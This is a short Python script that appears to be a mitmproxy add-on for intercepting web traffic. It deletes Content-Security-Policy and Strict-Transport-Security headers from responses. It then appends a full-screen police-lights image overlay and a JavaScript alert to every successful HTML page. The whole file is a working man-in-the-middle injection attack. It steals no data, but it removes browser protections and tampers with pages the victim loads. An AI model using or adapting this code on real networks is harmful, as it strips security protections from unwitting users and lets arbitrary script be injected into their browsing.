OVERLAY_HTML = b"<img style='z-index:10000;width:100%;height:100%;top:0;left:0;position:fixed;opacity:0.5' src='https://cdn.winknews.com/wp-content/uploads/2019/01/Police-lights.-Photo-via-CBS-News..jpg' />"
OVERLAY_JS = b"<script>alert('You can\'t click anything on this page');</script>"

def remove_header(response, header_name):
    if header_name in response.headers:
        del response.headers[header_name]


def response(flow):
    # remove security headers in case they're present
    remove_header(flow.response, "Content-Security-Policy")
    remove_header(flow.response, "Strict-Transport-Security")
    # if content-type type isn't available, ignore
    if "content-type" not in flow.response.headers:
        return
    # if it's HTML & response code is 200 OK, then inject the overlay snippet (HTML & JS)
    if "text/html" in flow.response.headers["content-type"] and flow.response.status_code == 200:
        flow.response.content += OVERLAY_HTML
        flow.response.content += OVERLAY_JS